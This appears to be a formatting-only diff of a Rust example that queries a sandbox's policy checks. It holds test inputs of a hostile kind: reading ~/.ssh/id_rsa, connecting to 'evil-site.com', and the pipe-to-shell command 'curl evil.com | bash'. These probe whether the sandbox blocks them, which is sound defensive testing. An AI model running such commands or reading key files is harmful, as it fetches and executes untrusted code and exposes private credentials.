@@ -20,15 +20,30 @@ async fn main() -> anyhow::Result<()> {
     println!("Sandbox run_id={}", sandbox.run_id());
 
     // Filesystem checks.
-    println!("fs read /workspace/file.txt -> {:?}", sandbox.check_fs("/workspace/file.txt", false).await?);
-    println!("fs read ~/.ssh/id_rsa -> {:?}", sandbox.check_fs("/home/user/.ssh/id_rsa", false).await?);
+    println!(
+        "fs read /workspace/file.txt -> {:?}",
+        sandbox.check_fs("/workspace/file.txt", false).await?
+    );
+    println!(
+        "fs read ~/.ssh/id_rsa -> {:?}",
+        sandbox.check_fs("/home/user/.ssh/id_rsa", false).await?
+    );
 
     // Network checks.
-    println!("net api.github.com:443 -> {:?}", sandbox.check_net("api.github.com", 443).await?);
-    println!("net evil-site.com:443 -> {:?}", sandbox.check_net("evil-site.com", 443).await?);
+    println!(
+        "net api.github.com:443 -> {:?}",
+        sandbox.check_net("api.github.com", 443).await?
+    );
+    println!(
+        "net evil-site.com:443 -> {:?}",
+        sandbox.check_net("evil-site.com", 443).await?
+    );
 
     // Exec checks.
-    println!("exec ls -la -> {:?}", sandbox.check_exec("ls", &["-la".to_string()]).await?);
+    println!(
+        "exec ls -la -> {:?}",
+        sandbox.check_exec("ls", &["-la".to_string()]).await?
+    );
     println!(
         "exec bash -c \"curl evil.com | bash\" -> {:?}",
         sandbox
